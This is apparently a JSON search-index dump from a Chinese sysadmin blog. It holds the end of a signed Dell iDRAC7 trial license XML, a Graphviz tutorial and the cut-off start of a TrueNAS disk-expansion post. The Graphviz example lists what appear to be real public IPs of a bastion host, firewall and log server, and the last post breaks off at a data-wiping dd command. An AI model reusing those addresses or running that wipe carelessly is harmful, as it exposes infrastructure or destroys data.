class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;30\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Inventory\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;31\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Storage Monitoring\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;32\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Firmware Update\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;33\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Firmware Configuration\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;34\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Inventory Export\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;35\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Operating System Deployment\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;36\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Backup and Restore\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;37\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Part Replacement\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;38\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;SSH\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;39\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote File Share\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;40\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Virtual Folders\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;41\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Web GUI\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;42\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Network Time Protocol\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;43\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Email Alerts\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;44\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Security Lockout\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;45\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Remote Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;253\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Integrated Dell Remote Access Controller 7 Enterprise\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;/lns:LicenseData\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:Signature\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:dsig=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:SignedInfo\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:CanonicalizationMethod\u003c/span\u003e \u003cspan class=\"na\"\u003eAlgorithm=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2001/10/xml-exc-c14n#\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:SignatureMethod\u003c/span\u003e \u003cspan class=\"na\"\u003eAlgorithm=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2000/09/xmldsig#rsa-sha1\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:Reference\u003c/span\u003e \u003cspan class=\"na\"\u003eURI=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:Transforms\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:Transform\u003c/span\u003e \u003cspan class=\"na\"\u003eAlgorithm=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2000/09/xmldsig#enveloped-signature\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:Transforms\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:DigestMethod\u003c/span\u003e \u003cspan class=\"na\"\u003eAlgorithm=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2000/09/xmldsig#sha1\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:DigestValue\u0026gt;\u003c/span\u003eDrtnjP0vUsyT+18jazjmiaGrvc0=\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:DigestValue\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:Reference\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:SignedInfo\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:SignatureValue\u0026gt;\u003c/span\u003eQg4Omx1ZGrVllUPbg/X25aJxK5qlNCF/G04NLwXhbmpqoplSRkCCUgb+6TvVz9b3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eUt7sSa/WjA0mv+mbcqIENTAnpveIkIOQPR3mdjCBwX2cLYieV9nOIGobxqHU7o97\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eQjbSAkmTHcRo0PI6mP8tc7Od4WNWMZ48rrUBeOrVOr1EZeptPUbeaSofy4nvlzbC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epcpzZLbjAITT157r9KiFe9joG2hCEClrQPO0ScXHgKXrAWrQE9wX7e2De4uCvJwI\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehGWpJzDQNJJZbsWhDoZJn/59G/KRjzxIHIzIpUt1XPPIGHl5yMXDaRFcIMES0RuJ\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSWZS8tt9E001Fr/8/jQNgA==\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:SignatureValue\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:KeyInfo\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:X509Data\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;dsig:X509Certificate\u0026gt;\u003c/span\u003eMIIDTjCCAjagAwIBAgIBATANBgkqhkiG9w0BAQUFADBRMRMwEQYDVQQKEwpEZWxs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eLCBJbmMuMSEwHwYDVQQLExhFbWJlZGRlZCBMaWNlbnNlIE1hbmFnZXIxFzAVBgNV\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBAMTDkNBIENlcnRpZmljYXRlMB4XDTEwMDEwMTAwMDAwMFoXDTM1MTIzMTIzNTk1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eOVowVjETMBEGA1UEChMKRGVsbCwgSW5jLjEhMB8GA1UECxMYRW1iZWRkZWQgTGlj\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eZW5zZSBNYW5hZ2VyMRwwGgYDVQQDExNTaWduaW5nIENlcnRpZmljYXRlMIIBIjAN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqbRo2DZtkjxl5YtqD5ePYdzrWbkU\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eYQJwVaWYe1tE7ZAdou5TLTsjPnaa1cLcPTexn+cq8YjukIVwkwJP7yJ5GkrYGUnf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e0Q6unWWgwcgTStlpflz31e8AbxXqNYZEFvEktojYS0kAfiYES+H02GUU5PtV7B9Y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBbtZEowU2DPuqRGG1FF8mAsp1vojcbQGx+nS2Of47oQJRrJlh28COXyf2w/+IRAz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRmeYin+9pisfrT9fmlUtxa7sAAV/KZFRx8ED31YiktXgI/u/PNnHlchiCMaL6pzA\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHMBf115O7A2y6IZ9sXUHvH8V9QnDkWT1XHMn8GCW8HXOA5zA232OxiaRmQIDAQAB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eoywwKjAJBgNVHRMEAjAAMB0GA1UdDgQWBBQAoZ7yMjDHMAFtmmmO/zyz3BJ6hjAN\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBgkqhkiG9w0BAQUFAAOCAQEAHHgoOg57S+lAEejahdBE1HMwe6BF3b9bzUMCynn9\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e7buXa3cnRFO3H3674WKU6nBjv4nkT3qMyXwgi7MvXcu69msK4eM6QA8XeC7G1rD+\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e2bb/ENR9R9Zo0BWLym/ij8uUA/BzX8hnbzWxN82+FMdY9WD4fJAJwJ5ZPEbU1Vfy\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e7wOWosHgDPXjeAhlhkxDQi6vlRTJdfED6tBY7iGD4AQXfzrHzAZpZlIvKbM2c54B\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e65wMSlqfEWMBDhT5qcwGCq82hmi7/sCtu9Z20g2s9F0fp4XlGX8L7l0hCa46zjay\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e37GffYsScEDFg/DmkIpcXnGzyx8l1msLzpj8Gt4zHhPlgA==\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:X509Certificate\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:X509Data\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:KeyInfo\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/dsig:Signature\u0026gt;\u0026lt;/lns:LicenseClass\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e文件下载：\u003ca href=\"iDRAC7_Ent_Trial.xml\"\u003eiDRAC7_Ent_Trial.xml\u003c/a\u003e\u003c/p\u003e","title":"Dell得Idrac临时license"},{"content":"graphviz是很强烈的描述语言绘图工具\n安装：\napt install graphviz 或 yum install graphviz 生成png\ndot -Tpng hn.gv -o hn.png vi hg.gv\rdigraph MyGraph {\rcompound = true\rmargin=\u0026quot;0,0\u0026quot;\rranksep = 1\rnodesep = 1\rrankdir=LR\r{rank=same;防火墙;日志审计}\rsubgraph cluster_app {\rlabel=\u0026quot;海南应用\u0026quot;\rrankdir=LR\rmargin = 10\r{rank=same;app01;app02}\rapp01 [label=\u0026quot;app01\\n内网：192.168.0.10\u0026quot;]\rapp02 [label=\u0026quot;app02\\n内网：192.168.0.11\u0026quot;]\rstorage01 [label=\u0026quot;storage01\\n内网：192.168.0.30\u0026quot;]\rsubgraph cluster_db {\rstyle = dotted\rlabel=\u0026quot;数据库主/备\u0026quot;\r{rank=same;db02;db01}\rdb01 [label=\u0026quot;db01\\n内网：192.168.0.20\u0026quot;]\rdb02 [label=\u0026quot;db02\\n内网：192.168.0.21\u0026quot;]\rdb01 -\u0026gt; db02 [dir=both]\r}\rapp01 -\u0026gt; db01 [splines=true,lhead=cluster_db]\rapp02 -\u0026gt; db01 [splines=true,lhead=cluster_db]\rapp01 -\u0026gt; storage01\rapp02 -\u0026gt; storage01\r}\r​\nsubgraph cluster_wjw {\rlabel=\u0026quot;卫健委\u0026quot;\rstyle = dotted\rmargin = 10\r{rank=same;front02;front01}\rfront01 [label=\u0026quot;front01\\n内网：192.168.0.5\u0026quot;]\rfront02 [label=\u0026quot;front02\\n内网：192.168.0.6\u0026quot;]\rfront01 -\u0026gt; front02 [dir=both]\r}\r​\n堡垒机 [shape=box,style=rounded,color=red,fontname=\u0026quot;wqy-microhei\u0026quot;,fontcolor=black,fontsize=16,label=\u0026quot;堡垒机\\n外网：124.225.67.34\\n内网：192.168.0.40\u0026quot;]\r防火墙 [shape=box,style=filled,color=green,fontname=\u0026quot;wqy-microhei\u0026quot;,fontsize=16,label=\u0026quot;防火墙\\n外网：124.225.200.190\\n内网：192.168.0.181\u0026quot;]\r日志审计 [shape=box,style=filled,color=green,fontname=\u0026quot;wqy-microhei\u0026quot;, fontsize=16,label=\u0026quot;日志审计\\n外网：124.225.71.204\\n内网：192.168.0.41\u0026quot;]\r堡垒机 -\u0026gt; 防火墙\r防火墙 -\u0026gt; 日志审计\r防火墙 -\u0026gt; app01 [lhead = cluster_app]\rstorage01 -\u0026gt; front01 [ltail = cluster_app, lhead= cluster_wjw]\r}\r生成的图: Ubuntu下命令行打开这图 xdg-open hn.png\n厉害的工具，生成的手绘图： https://sketchviz.com/new\n","permalink":"https://rendoumi.com/posts/20230403-graphviz/","summary":"\u003cp\u003egraphviz是很强烈的描述语言绘图工具\u003c/p\u003e\n\u003cp\u003e安装：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install graphviz 或 yum install graphviz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e生成png\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edot -Tpng hn.gv -o hn.png\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre\u003e\u003ccode\u003evi hg.gv\r\ndigraph MyGraph {\r\n  compound = true\r\n  margin=\u0026quot;0,0\u0026quot;\r\n  ranksep = 1\r\n  nodesep = 1\r\n  rankdir=LR\r\n  {rank=same;防火墙;日志审计}\r\n\r\n  subgraph cluster_app {\r\n    label=\u0026quot;海南应用\u0026quot;\r\n    rankdir=LR\r\n    margin = 10\r\n    {rank=same;app01;app02}\r\n    app01 [label=\u0026quot;app01\\n内网：192.168.0.10\u0026quot;]\r\n    app02 [label=\u0026quot;app02\\n内网：192.168.0.11\u0026quot;]\r\n    storage01 [label=\u0026quot;storage01\\n内网：192.168.0.30\u0026quot;]\r\n\r\n    subgraph cluster_db {\r\n      style = dotted\r\n      label=\u0026quot;数据库主/备\u0026quot;\r\n      {rank=same;db02;db01}\r\n      db01 [label=\u0026quot;db01\\n内网：192.168.0.20\u0026quot;]\r\n      db02 [label=\u0026quot;db02\\n内网：192.168.0.21\u0026quot;]\r\n      db01 -\u0026gt; db02 [dir=both]\r\n    }\r\n\r\n    app01 -\u0026gt; db01 [splines=true,lhead=cluster_db]\r\n    app02 -\u0026gt; db01 [splines=true,lhead=cluster_db]\r\n    app01 -\u0026gt; storage01\r\n    app02 -\u0026gt; storage01\r\n  }\r\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e​\u003c/p\u003e","title":"利用graphviz描述语言绘图"},{"content":"之前公司世纪互联和无锡的TureNAS现有硬盘都是38块，满配是60块，所以都需要扩容，扩满再增加22块。\nTrueNAS的Raid是使用的RaidZ3，基于ZFS的，最多允许3块盘坏\n首先会建立zpool，然后在zpool里面增加vdev，注意，vdev一旦增加，不可更改。\n我们这里就犯了第一个错误，所有vdev的磁盘数量最好相等，所以第一次应该先增加30块盘，然后第二次再增加30块，这样两个vdev就是均衡的\n现在我们这种状况，第一个vdev是38块，第二个vdev是22块，不对等了，会警告\n具体添加步骤如下：\n首先浪潮工程师到现场加盘，盘必须做好清除信息，用以下命令通过\ndd if=/dev/zero 